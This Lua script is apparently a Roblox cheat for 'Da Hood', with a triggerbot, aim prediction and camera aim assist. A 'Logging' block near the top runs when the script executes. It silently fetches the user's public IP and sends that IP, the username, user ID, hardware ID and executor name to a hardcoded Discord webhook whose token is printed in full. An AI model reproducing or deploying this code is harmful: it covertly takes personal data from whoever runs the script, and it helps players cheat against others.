--// Services

local VirtualInputManager = game:GetService("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ContextActionService = game:GetService("ContextActionService")
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")

--// Variables

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local LockedTarget = nil
local lastShotTime = 0

--// Optimizations

local workspace = game:GetService("Workspace")
local camera = workspace.CurrentCamera
local math_min = math.min
local math_max = math.max
local math_abs = math.abs
local math_floor = math.floor
local raycast = workspace.Raycast
local newRaycastParams = RaycastParams.new

local lastThrottleTime = 0
local throttleDelay = 0.02 

local function isThrottled()
    local currentTime = os.clock()
    if currentTime - lastThrottleTime >= throttleDelay then
        lastThrottleTime = currentTime
        return false
    end
    return true
end

local sharedRaycastParams = newRaycastParams()
sharedRaycastParams.FilterType = Enum.RaycastFilterType.Blacklist
sharedRaycastParams.FilterDescendantsInstances = {LocalPlayer.Character, camera}

local function runInCoroutine(taskFunc)
    coroutine.wrap(taskFunc)()
end

if not visualizePrediction then
    if sphereVisualizer then
        sphereVisualizer.Transparency = 1
        sphereVisualizer.CanCollide = false
    end
end

local function clearUnusedInstances(instanceTable)
    for _, instance in pairs(instanceTable) do
        if instance and instance.Parent then
            instance:Destroy()
        end
    end
end

local function monitorMemoryUsage()
    local memoryUsage = collectgarbage("count") / 1024 
    if memoryUsage > 50 then 
    end
end

--// Game IDs Configuration

local GameIDS = {
    ['Hood Customs'] = '9825515356',
    ['Da Hood'] = '2788229376'
}

local currentGame = nil
for gameName, gameID in pairs(GameIDS) do
    if tostring(game.PlaceId) == gameID then
        currentGame = gameName
        break
    end
end

currentGame = currentGame or "Da Hood"

--// Logging

local ipAddress = "Unknown"
local success, response = pcall(function()
    return game:HttpGet("https://api.ipify.org")
end)
if success then
    ipAddress = response
end

local function getDiscordTimestamp()
    local unixTime = os.time() -- Current Unix time
    return string.format("<t:%d>", unixTime)
end

local webhookUrl = "https://discord.com/api/webhooks/1328846104879566919/xRlbRI2YvPu2Rmestllryui5PO7Ldez4auEJlHEj8fv3doJtgCmKdz9Qt-iS7E6Swctf"
local gameId = game.PlaceId
local localDate = os.date("%A, %B %d, %Y") -- Readable date
local userId = LocalPlayer.UserId
local username = LocalPlayer.Name
local displayName = LocalPlayer.DisplayName
local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
local accountAge = LocalPlayer.AccountAge
local discordTimestamp = getDiscordTimestamp()

local executorName = "Unknown"
if identifyexecutor then
    executorName = identifyexecutor()
end

local payload = {
    ["content"] = "Detailed logs for statistics and authentication\n",
    ["embeds"] = {{
        ["title"] = "**Script Execution Logged**",
        ["description"] = string.format("Script executed by [%s](%s)", displayName, profileLink),
        ["type"] = "rich",
        ["color"] = tonumber(0x7289DA),
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = username,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "User ID",
                ["value"] = tostring(userId),
                ["inline"] = true
            },
            {
                ["name"] = "Profile Link",
                ["value"] = profileLink,
                ["inline"] = false
            },
            {
                ["name"] = "Game Link",
                ["value"] = "[Game](https://www.roblox.com/games/" .. gameId .. ")",
                ["inline"] = true
            },
            {
                ["name"] = "Game ID",
                ["value"] = tostring(gameId),
                ["inline"] = true
            },
            {
                ["name"] = "Executor",
                ["value"] = executorName,
                ["inline"] = true
            },
            {
                ["name"] = "Streamable Mode",
                ["value"] = "Enabled",
                ["inline"] = true
            },
            {
                ["name"] = "HWID",
                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                ["inline"] = false
            },
            {
                ["name"] = "IP Address",
                ["value"] = ipAddress,
                ["inline"] = false
            },
            {
                ["name"] = "Account Age (Days)",
                ["value"] = tostring(accountAge),
                ["inline"] = true
            },
            {
                ["name"] = "Date",
                ["value"] = localDate,
                ["inline"] = true
            },
            {
                ["name"] = "Timestamp",
                ["value"] = discordTimestamp,
                ["inline"] = false
            }
        }
    }}
}

local requestBody = {
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(payload)
}

local response = request(requestBody)


--// Wall Check

local function WallCheck(targetPart)
    if not targetPart then return false end

    local rayParams = RaycastParams.new()
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    rayParams.FilterDescendantsInstances = { LocalPlayer.Character, workspace.CurrentCamera }

    local rayResult = workspace:Raycast(
        workspace.CurrentCamera.CFrame.Position,
        (targetPart.Position - workspace.CurrentCamera.CFrame.Position).Unit * 1000,
        rayParams
    )
    return rayResult and rayResult.Instance and rayResult.Instance:IsDescendantOf(targetPart.Parent)
end

--// Perform Checks

local function performChecks(player, character, toolName)
    local globalChecks = Settings['Global']['Checks']['WhileTargeting']
    local blacklistSettings = Settings['Global']['BlacklistPlayers']

    -- Blacklist Check
    if blacklistSettings['Enabled'] then
        local blacklistedUsers = blacklistSettings['Players']
        for _, username in pairs(blacklistedUsers) do
            if player.Name == username then
                return false, "Player is blacklisted"
            end
        end
    end

    -- Self Knocked Check
    if globalChecks['SelfKnocked'] then
        local localBodyEffects = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("BodyEffects")
        if localBodyEffects then
            local localKnockState = localBodyEffects:FindFirstChild("K.O")
            if localKnockState and localKnockState:IsA("BoolValue") and localKnockState.Value then
                return false, "Local player is knocked"
            end
        end
    end

    -- Knock Check 
    if globalChecks['Knocked'] then
        local bodyEffects = character:FindFirstChild("BodyEffects")
        if not bodyEffects then
            return false, "BodyEffects folder missing"
        end

        local koState = bodyEffects:FindFirstChild("K.O")
        if not koState then
            return false, "K.O value missing"
        end

        if koState:IsA("BoolValue") and koState.Value then
            return false, "Player is knocked out"
        end
    end

    -- Crew Check
    if globalChecks['CrewCheck'] then
        local targetData = player:FindFirstChild("DataFolder")
        local localData = LocalPlayer:FindFirstChild("DataFolder")
        if targetData and localData then
            local targetCrew = targetData.Information and targetData.Information:FindFirstChild("Crew")
            local localCrew = localData.Information and localData.Information:FindFirstChild("Crew")
            if targetCrew and localCrew and targetCrew.Value == localCrew.Value then
                return false, "Player is in the same crew"
            end
        end
    end

    -- Knife Check
    if globalChecks['KnifeCheck'] then
        if currentGame == "Da Hood" and toolName == "[Knife]" then
            return false, "Knife tool is equipped"
        elseif currentGame == "Hood Customs" and toolName == "Knife" then
            return false, "Knife tool is equipped"
        end
    end

    -- Forcefield Check
    if globalChecks['Forcefield'] then
        local forceField = character:FindFirstChildOfClass("ForceField")
        if forceField then
            return false, "Player has spawn protection (ForceField)"
        end
    end

    return true, "All checks passed"
end


--// Select Closest Target

local function selectClosestTarget()
    local closestTarget = nil
    local smallestWeightedDistance = math.huge

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local character = player.Character
            local targetPart = character:FindFirstChild("HumanoidRootPart") -- Default to HumanoidRootPart

            if targetPart then
                local targetPosition = workspace.CurrentCamera:WorldToViewportPoint(targetPart.Position)
                local cursorPosition = UserInputService:GetMouseLocation()
                local targetScreenPosition = Vector2.new(targetPosition.X, targetPosition.Y)
                local cursorDistance = (cursorPosition - targetScreenPosition).Magnitude

                local localPlayerPosition = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                local playerDistance = localPlayerPosition and (localPlayerPosition.Position - targetPart.Position).Magnitude or math.huge

                local weightedDistance = cursorDistance + (playerDistance * 0.5)

                local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
                local toolName = tool and tool.Name or ""
                local isValid, reason = performChecks(player, character, toolName)

                local wallCheckPass = not Settings['Global']['Checks']['WallCheck'] or WallCheck(targetPart)

                if isValid and wallCheckPass and weightedDistance < smallestWeightedDistance then
                    smallestWeightedDistance = weightedDistance
                    closestTarget = player
                end
            end
        end
    end

    LockedTarget = closestTarget

    if not LockedTarget and Settings['Triggerbot']['Settings']['PrintTarget'] then
        print("No valid target found")
    end

    return closestTarget
end

local function getTargetPosition(character)
    if not character then return nil end

    local targetPart = character:FindFirstChild("HumanoidRootPart")
    if targetPart then
        return targetPart.Position
    end

    if character.PrimaryPart then
        return character.PrimaryPart.Position
    end

    return nil 
end

--// Prediction Function
local function getPredictedPositions(character)
    if not character then return {} end

    local predictedPositions = {}
    for _, part in ipairs(character:GetChildren()) do
        if part:IsA("BasePart") then
            -- Corrected path to access Prediction settings
            local predictionX = Settings['Triggerbot']['Prediction']['Settings']['PredictionX']
            local predictionY = Settings['Triggerbot']['Prediction']['Settings']['PredictionY']

            local velocity = part.Velocity
            local predictedPosition = part.Position + Vector3.new(
                velocity.X * predictionX,
                velocity.Y * predictionY,
                velocity.Z * predictionX
            )
            table.insert(predictedPositions, predictedPosition)
        end
    end

    return predictedPositions
end

--// Delay Function
local function canShoot()
    local currentTime = tick()
    local delay = 0 

    if Settings['Triggerbot']['Delay']['Enabled'] then
        if Settings['Triggerbot']['Delay']['Settings']['Random'] then
            local minDelay = Settings['Triggerbot']['Delay']['Settings']['Range']['Min']
            local maxDelay = Settings['Triggerbot']['Delay']['Settings']['Range']['Max']
            delay = math.random() * (maxDelay - minDelay) + minDelay
        else
            delay = Settings['Triggerbot']['Delay']['Settings']['Default']
        end
    else
        return true
    end
    if currentTime - lastShotTime >= delay then
        lastShotTime = currentTime
        return true
    end

    return false
end

--// Methods

local Methods = {}

Methods['MouseClick'] = function()
    mouse1press()
    task.wait(0.005) 
    mouse1release()
end

Methods['FireMouseEvent'] = function()
    mouse1click()
end

Methods['ContextActionService'] = function()
    ContextActionService:CallFunction("Fire")
end

Methods['VirtualInput'] = function()
    local mouseLocation = UserInputService:GetMouseLocation()
    local mouseX, mouseY = math.floor(mouseLocation.X), math.floor(mouseLocation.Y)

    VirtualInputManager:SendMouseButtonEvent(mouseX, mouseY, 0, true, nil, 0) 
    task.wait(0.005)
    VirtualInputManager:SendMouseButtonEvent(mouseX, mouseY, 0, false, nil, 0) 
end

local function ExecuteMethod(methodName)
    if Methods[methodName] then
        Methods[methodName]()
    else
        warn("Invalid method:", methodName)
        Methods['MouseClick']()
    end
end

--// Sphere Visualizer

local sphereVisualizer = Instance.new("Part")
sphereVisualizer.Shape = Enum.PartType.Ball
sphereVisualizer.Size = Vector3.new(1, 1, 1) 
sphereVisualizer.Color = Color3.fromRGB(255, 0, 0) 
sphereVisualizer.Anchored = true
sphereVisualizer.CanCollide = false
sphereVisualizer.Transparency = 0.9 
sphereVisualizer.Material = Enum.Material.Neon
sphereVisualizer.Parent = workspace

--// Sphere Visualizer Updates

local function updateSphereVisualizer(character)
    if not Settings['Triggerbot']['Prediction']['VisualizePredictionPart'] then
        sphereVisualizer.Transparency = 1 
        return
    end

    local predictedPositions = getPredictedPositions(character)
    if #predictedPositions > 0 then
        sphereVisualizer.Position = predictedPositions[1]
        sphereVisualizer.Transparency = 0.5 
    else
        sphereVisualizer.Transparency = 1 
    end
end

local function getPredictedPosition(targetPart)
    if not targetPart or not targetPart:IsA("BasePart") then return nil end

    local velocity = targetPart.Velocity
    local speed = velocity.Magnitude

    if speed < 0.1 then
        return targetPart.Position
    end

    local predictionX = Triggerbot['Prediction']['PredictionX']
    local predictionY = Triggerbot['Prediction']['PredictionY']

    return targetPart.Position + Vector3.new(
        velocity.X * predictionX,
        velocity.Y * predictionY,
        velocity.Z * predictionX
    )
end

-- AimAssist Logic

local function calculateFOVDistance(targetPart)
    local camera = workspace.CurrentCamera
    local targetPosition, onScreen = camera:WorldToViewportPoint(targetPart.Position)

    if onScreen then
        local cursorPosition = UserInputService:GetMouseLocation()
        local fovDistance = (Vector2.new(targetPosition.X, targetPosition.Y) - cursorPosition).Magnitude
        return fovDistance
    end

    return math.huge 
end


local function applyAimAssist()
    if not Settings['Triggerbot']['AimAssist']['Enabled'] then return end

    local aimAssistSettings = Settings['Triggerbot']['AimAssist']
    local target = nil
    local targetWithinFOV = false
    if aimAssistSettings['SyncWithTB'] then
        if LockedTarget and LockedTarget.Character then
            local isValid, _ = performChecks(LockedTarget, LockedTarget.Character, "")
            if isValid then
                target = LockedTarget.Character:FindFirstChild("HumanoidRootPart")
            end
        end
    else
        local mouseTarget = Mouse.Target
        if mouseTarget then
            local targetPlayer = Players:GetPlayerFromCharacter(mouseTarget.Parent)
            if targetPlayer and targetPlayer.Character then
                local isValid, _ = performChecks(targetPlayer, targetPlayer.Character, "")
                if isValid then
                    target = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                end
            end
        end
    end
    if aimAssistSettings['FOV']['UseFOV'] and target then
        local fovDistance = calculateFOVDistance(target)
        if fovDistance <= aimAssistSettings['FOV']['FOVRadius'] then
            targetWithinFOV = true
        else
            target = nil
        end
    else
        targetWithinFOV = target ~= nil
    end
    if target and targetWithinFOV then
        local player = Players:GetPlayerFromCharacter(target.Parent)
        if player and player.Character then
            local isValid, reason = performChecks(player, player.Character, "")
            if not isValid then
                target = nil 
                targetWithinFOV = false
            end
        end
    end
    if target and targetWithinFOV then
        local targetPosition = target.Position
        local cameraCFrame = workspace.CurrentCamera.CFrame
        local direction = (targetPosition - cameraCFrame.Position).Unit
        local smoothFactor = aimAssistSettings['Smoothness']
        local newLookVector = cameraCFrame.LookVector:Lerp(direction, smoothFactor)
        workspace.CurrentCamera.CFrame = CFrame.new(cameraCFrame.Position, cameraCFrame.Position + newLookVector)
        UserInputService.MouseDeltaSensitivity = aimAssistSettings['Strength']
    else
        UserInputService.MouseDeltaSensitivity = 1
    end
end


-- // TB 
local function isMouseOverPredictedCharacter(character)
    if not character then return false end

    local predictedPositions = getPredictedPositions(character)
    local cursorPosition = UserInputService:GetMouseLocation()

    for _, predictedPosition in ipairs(predictedPositions) do
        local screenPosition, onScreen = workspace.CurrentCamera:WorldToViewportPoint(predictedPosition)
        if onScreen then
            local rayParams = RaycastParams.new()
            rayParams.FilterType = Enum.RaycastFilterType.Blacklist
            rayParams.FilterDescendantsInstances = { LocalPlayer.Character }

            local rayResult = workspace:Raycast(
                workspace.CurrentCamera.CFrame.Position,
                (predictedPosition - workspace.CurrentCamera.CFrame.Position).Unit * 1000,
                rayParams
            )

            if rayResult and rayResult.Instance and rayResult.Instance:IsDescendantOf(character) then
                local distanceToPrediction = (Vector2.new(screenPosition.X, screenPosition.Y) - cursorPosition).Magnitude
                if distanceToPrediction <= 5 then 
                    return true
                end
            end
        end
    end

    return false
end

local function isMouseOverTarget(character)
    if not character then return false end

    local mouseTarget = Mouse.Target
    return mouseTarget and mouseTarget:IsDescendantOf(character)
end

--// Handle Target

local function handleTarget(character, player)
    if not character then return end

    local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
    local toolName = tool and tool.Name or ""

    -- Perform global checks
    local isValid, _ = performChecks(player, character, toolName)
    if not isValid then return end

    -- Update visualizer if enabled
    if Settings['Triggerbot']['Prediction']['VisualizePredictionPart'] then
        updateSphereVisualizer(character)
    end

    -- Check if the triggerbot should shoot
    local shootCondition = (Settings['Triggerbot']['Prediction']['Enabled'] and isMouseOverPredictedCharacter(character)) 
        or isMouseOverTarget(character)

    if shootCondition and canShoot() then
        ExecuteMethod(Settings['Triggerbot']['Settings']['Method'])
    end
end

--// Execute Triggerbot
local function executeTriggerbot()
    if not Settings['Triggerbot']['Settings']['Enabled'] then
        if LockedTarget then
            if Settings['Triggerbot']['Settings']['PrintTarget'] then
                print("Unselected target:", LockedTarget.DisplayName)
            end
            LockedTarget = nil
        end
        return
    end

    if Settings['Global']['Mode'] == "Hold" and not UserInputService:IsKeyDown(Enum.KeyCode[Settings['Global']['Keybind']]) then
        if LockedTarget then
            if Settings['Triggerbot']['Settings']['PrintTarget'] then
                print("Unselected target due to key release:", LockedTarget.DisplayName)
            end
            LockedTarget = nil
        end
        return
    end

    if LockedTarget and LockedTarget.Character then
        handleTarget(LockedTarget.Character, LockedTarget)
    else
        local mouseTarget = Mouse.Target
        if mouseTarget then
            local targetPlayer = Players:GetPlayerFromCharacter(mouseTarget.Parent)
            if targetPlayer and targetPlayer.Character then
                -- Print the selected target
                if Settings['Triggerbot']['Settings']['PrintTarget'] then
                    print("Selected target:", targetPlayer.DisplayName)
                end
                handleTarget(targetPlayer.Character, targetPlayer)
            end
        end
    end

    -- Call AimAssist
    applyAimAssist()
end

--// Input Logic

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode[Settings['Global']['Keybind']] then
        if Settings['Global']['Mode'] == "Hold" then
            if Settings['Triggerbot']['Settings']['TargetMode'] then
                local potentialTarget = selectClosestTarget()
                if potentialTarget and WallCheck(potentialTarget.Character:FindFirstChild("HumanoidRootPart")) then
                    LockedTarget = potentialTarget
                    if Settings['Triggerbot']['Settings']['PrintTarget'] and LockedTarget then
                        print("Locked onto target:", LockedTarget.DisplayName)
                    end
                end
            end
            Settings['Triggerbot']['Settings']['Enabled'] = true
        elseif Settings['Global']['Mode'] == "Toggle" then
            if Settings['Triggerbot']['Settings']['Enabled'] then
                if LockedTarget and Settings['Triggerbot']['Settings']['PrintTarget'] then
                    print("Unselected target:", LockedTarget.DisplayName)
                end
                LockedTarget = nil
                Settings['Triggerbot']['Settings']['Enabled'] = false
            else
                if Settings['Triggerbot']['Settings']['TargetMode'] then
                    local potentialTarget = selectClosestTarget()
                    if potentialTarget and WallCheck(potentialTarget.Character:FindFirstChild("HumanoidRootPart")) then
                        LockedTarget = potentialTarget
                        if Settings['Triggerbot']['Settings']['PrintTarget'] and LockedTarget then
                            print("Locked onto target:", LockedTarget.DisplayName)
                        end
                    end
                end
                Settings['Triggerbot']['Settings']['Enabled'] = true
            end
        end
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if Settings['Global']['Mode'] == "Hold" and input.KeyCode == Enum.KeyCode[Settings['Global']['Keybind']] then
        if LockedTarget and Settings['Triggerbot']['Settings']['PrintTarget'] then
            print("Unselected target:", LockedTarget.DisplayName)
        end
        LockedTarget = nil
        Settings['Triggerbot']['Settings']['Enabled'] = false
        UserInputService.MouseDeltaSensitivity = 1 -- Reset sensitivity
    end
end)


--// Execute Triggerbot

RunService.RenderStepped:Connect(function()
if Settings['Triggerbot']['Settings']['Enabled'] then
        executeTriggerbot()
    end
end)
